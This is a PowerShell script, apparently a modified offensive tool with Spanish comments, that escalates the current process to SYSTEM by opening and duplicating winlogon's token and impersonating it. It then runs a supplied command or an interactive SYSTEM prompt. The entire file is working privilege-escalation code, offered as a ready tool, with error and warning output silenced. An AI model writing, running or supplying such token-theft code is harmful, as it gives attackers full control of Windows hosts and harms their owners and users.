function Invoke-RunAsSystem {
    
    <#
    .SYNOPSIS
    Invoke-RunAsSystem - Versión MODIFICADA
    Eleva el proceso ACTUAL a SYSTEM sin lanzar nuevos procesos PowerShell
    Author: Modificado por solicitud
    #>

    param (
        [string]$Timeout = "30000",
        [string]$Command
    )
    
    $ErrorActionPreference = "SilentlyContinue"
    $WarningPreference = "SilentlyContinue"
    
    # =============================================
    # 1. OBTENER TOKEN DE SYSTEM
    # =============================================
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class WinAPI {
        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool OpenProcessToken(
            IntPtr ProcessHandle, 
            uint DesiredAccess, 
            out IntPtr TokenHandle
        );
        
        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool DuplicateTokenEx(
            IntPtr hExistingToken,
            uint dwDesiredAccess,
            IntPtr lpTokenAttributes,
            uint ImpersonationLevel,
            uint TokenType,
            out IntPtr phNewToken
        );
        
        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool ImpersonateLoggedOnUser(
            IntPtr hToken
        );
        
        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool RevertToSelf();
        
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool CloseHandle(IntPtr hObject);
        
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr GetCurrentProcess();
        
        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool SetTokenInformation(
            IntPtr TokenHandle,
            uint TokenInformationClass,
            IntPtr TokenInformation,
            uint TokenInformationLength
        );
    }
"@

    # Constantes
    $TOKEN_QUERY = 0x0008
    $TOKEN_DUPLICATE = 0x0002
    $TOKEN_IMPERSONATE = 0x0004
    $TOKEN_ASSIGN_PRIMARY = 0x0001
    $SecurityImpersonation = 2
    $TokenImpersonation = 2

    # =============================================
    # 2. OBTENER PID DE WINLOGON (SIEMPRE SYSTEM)
    # =============================================
    $systemPid = (Get-Process -Name winlogon -ErrorAction SilentlyContinue)[0].Id
    if (-not $systemPid) {
        Write-Error "[!] No se encontró el proceso winlogon (SYSTEM)"
        return
    }
    
    Write-Host "[*] Proceso SYSTEM encontrado (PID: $systemPid)"
    
    # =============================================
    # 3. ABRIR Y DUPLICAR TOKEN DE SYSTEM
    # =============================================
    $hToken = 0
    $success = [WinAPI]::OpenProcessToken(
        (Get-Process -Id $systemPid).Handle,
        $TOKEN_QUERY -bor $TOKEN_DUPLICATE -bor $TOKEN_IMPERSONATE,
        [ref]$hToken
    )
    
    if (-not $success) {
        Write-Error "[!] No se pudo abrir el token de SYSTEM"
        return
    }
    
    $dupToken = 0
    $success = [WinAPI]::DuplicateTokenEx(
        $hToken,
        $TOKEN_ASSIGN_PRIMARY -bor $TOKEN_DUPLICATE -bor $TOKEN_IMPERSONATE,
        [IntPtr]::Zero,
        $SecurityImpersonation,
        $TokenImpersonation,
        [ref]$dupToken
    )
    
    [WinAPI]::CloseHandle($hToken) | Out-Null
    
    if (-not $success) {
        Write-Error "[!] No se pudo duplicar el token de SYSTEM"
        return
    }
    
    Write-Host "[*] Token de SYSTEM duplicado correctamente"
    
    # =============================================
    # 4. IMPERSONAR A SYSTEM EN EL PROCESO ACTUAL
    # =============================================
    $success = [WinAPI]::ImpersonateLoggedOnUser($dupToken)
    
    if (-not $success) {
        Write-Error "[!] No se pudo impersonar a SYSTEM"
        [WinAPI]::CloseHandle($dupToken) | Out-Null
        return
    }
    
    Write-Host "[+] PROCESO ACTUAL AHORA ES SYSTEM (impersonación activa)"
    Write-Host "[*] Usuario actual: $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)"
    
    # =============================================
    # 5. EJECUTAR COMANDO COMO SYSTEM
    # =============================================
    if ($Command) {
        Write-Host "[*] Ejecutando comando como SYSTEM..."
        
        # Ejecutar el comando en el contexto actual (que ahora es SYSTEM)
        $scriptBlock = [ScriptBlock]::Create($Command)
        $result = & $scriptBlock 2>&1
        
        Write-Host "[+] Resultado del comando:"
        Write-Host $result
    } else {
        # Modo interactivo - abrir shell en el proceso actual
        Write-Host "[*] Modo interactivo - Escribe comandos para ejecutar como SYSTEM"
        Write-Host "[*] Escribe 'exit' para salir"
        Write-Host ""
        
        while ($true) {
            $prompt = "[SYSTEM] PS " + (Get-Location).Path + "> "
            Write-Host -NoNewline $prompt
            
            $userCommand = Read-Host
            
            if ($userCommand -eq "exit") {
                Write-Host "[*] Saliendo del modo SYSTEM"
                break
            }
            
            if ($userCommand -ne "") {
                try {
                    $scriptBlock = [ScriptBlock]::Create($userCommand)
                    $result = & $scriptBlock 2>&1
                    Write-Host $result
                } catch {
                    Write-Host "[!] Error: $($_.Exception.Message)"
                }
                Write-Host ""
            }
        }
    }
    
    # =============================================
    # 6. REVERTIR A USUARIO ORIGINAL
    # =============================================
    [WinAPI]::RevertToSelf() | Out-Null
    [WinAPI]::CloseHandle($dupToken) | Out-Null
    
    Write-Host "[*] Sesión revertida a usuario original"
    Write-Host "[*] Usuario actual: $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)"
}
